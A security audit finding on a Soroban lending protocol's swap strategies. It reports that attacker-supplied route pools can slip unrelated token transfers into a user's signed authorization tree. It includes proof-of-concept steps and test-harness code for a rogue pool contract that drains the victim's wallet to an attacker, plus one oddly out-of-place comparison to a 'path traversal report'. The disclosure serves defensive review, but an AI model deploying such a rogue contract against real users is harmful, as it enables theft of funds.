### Title
Attacker-controlled route addresses can execute unauthorized wallet token transfers under the caller’s authorization - (File: `contracts/controller/src/strategies/swap.rs`)

### Summary
High severity. Controller strategy entrypoints accept opaque swap-route payloads and invoke the configured router, while route processing can invoke pool addresses supplied by that payload without an on-chain allowlist. If a venue/pool address resolves to attacker-controlled code, that code can request a token transfer from the user; Soroban records it as a child of the user’s existing strategy authorization, so a user who signs the simulated authorization tree authorizes theft of unrelated wallet assets. [1](#0-0) [2](#0-1) 

### Finding Description
`swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, `multiply`, and `flash_position` all reach the shared router boundary through `swap_tokens` or `swap_tokens_or_passthrough`. For `swap_collateral`, the strongest direct path is `Controller::swap_collateral(caller, account_id, current, from_amount, new, swap)`, which authenticates the account owner or delegate and forwards the attacker-supplied `StrategySwap` payload after withdrawing collateral. [3](#0-2) 

`swap_tokens` snapshots only `token_in` and `token_out`, authorizes one exact input-token transfer from the controller to the configured router, invokes `execute_strategy`, and later checks measured input spend and positive output. It places no constraint on other contracts invoked beneath the router or on additional authorization children added beneath the user’s root entry. [4](#0-3) 

The router decodes the payload’s asset registry, resolves a hop’s `pool`, `token_in`, and `token_out` from attacker-controlled indexes, and dispatches the hop to the selected venue. The documented trust boundary confirms that pool/token addresses are not allowlisted and that code reached through a route can add a transfer from the caller as a child of the caller’s authorization. [5](#0-4) [6](#0-5) 

This is analogous to the path traversal report because attacker-controlled route data escapes the intended swap-resource boundary and resolves to arbitrary code, which can then access an unintended resource: every token balance spendable under the user’s transaction authorization. [7](#0-6) [8](#0-7) 

### Impact Explanation
A malicious quote or route can drain assets unrelated to the lending position while still returning a valid swap output and satisfying the controller’s measured-output and solvency checks. The repository’s reproduction transfers the victim’s entire unrelated-token balance to the attacker while the expected collateral swap succeeds. [9](#0-8) 

The theft is not bounded by `amount_in`, `min_out`, market configuration, or final health-factor validation because those checks observe only the routed input and output tokens. The resulting impact is theft of user funds, with the maximum exposure equal to any balance the victim’s signed authorization tree permits the malicious child invocation to transfer. [10](#0-9) [11](#0-10) 

### Likelihood Explanation
Exploitation requires the victim to submit a crafted route and sign the authorization tree containing the malicious child transfer, but route bytes are opaque XDR and simulation presents the rogue token transfer beneath the normal strategy root. The threat model explicitly requires clients to decode the signed route and reject unexpected authorization children, indicating that protection currently depends on off-chain wallet behavior rather than protocol enforcement. [12](#0-11) [13](#0-12) 

An unprivileged attacker can deploy the malicious venue contract, construct the route, and deliver it through a compromised or malicious quoting path; no privileged role, leaked key, protocol upgrade, or invalid protocol parameter is needed. Likelihood is moderate rather than high because an authorization-aware wallet can detect and reject the extra child transfer. [14](#0-13) [15](#0-14) 

### Recommendation
Enforce a governance-controlled venue and pool allowlist in the router so route payloads cannot resolve hops to arbitrary contract addresses. Reject unexpected authorization trees in wallets and quote integrations, but treat client validation as defense-in-depth rather than the primary control. Where supported, isolate swap authorization to a dedicated router/spending address holding only the routed input so arbitrary route code cannot request unrelated wallet transfers. [2](#0-1) 

### Proof of Concept
1. Deploy a contract whose venue method calls `token.transfer(victim, attacker, victim_balance)` for a token unrelated to the lending markets.
2. Encode a route whose pool registry entry resolves a hop to that contract, while preserving a valid `token_in`, `token_out`, and economically sufficient `min_out`.
3. Have the victim invoke `swap_collateral(victim, account_id, usdc_key, amount, eth_key, route)` after normal simulation.
4. During router execution, the malicious pool invokes the unrelated token’s `transfer` under the victim’s authorization tree; the valid swap output lets the strategy’s measured-output and risk checks pass.
5. The test harness demonstrates that simulation records the unrelated transfer as a child of `swap_collateral`, and that signing that tree transfers `77_770_000_000` units from the victim to the attacker while crediting the fair `ETH` swap output. [9](#0-8) [15](#0-14)

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L24-54)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L151-169)
```rust
    match op.opcode {
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
            if out <= 0 {
                panic_with_error!(ctx.env, Error::ZeroOutput);
            }
            vault.deposit(&hop.token_out, out);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L39-47)
```rust
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-125)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
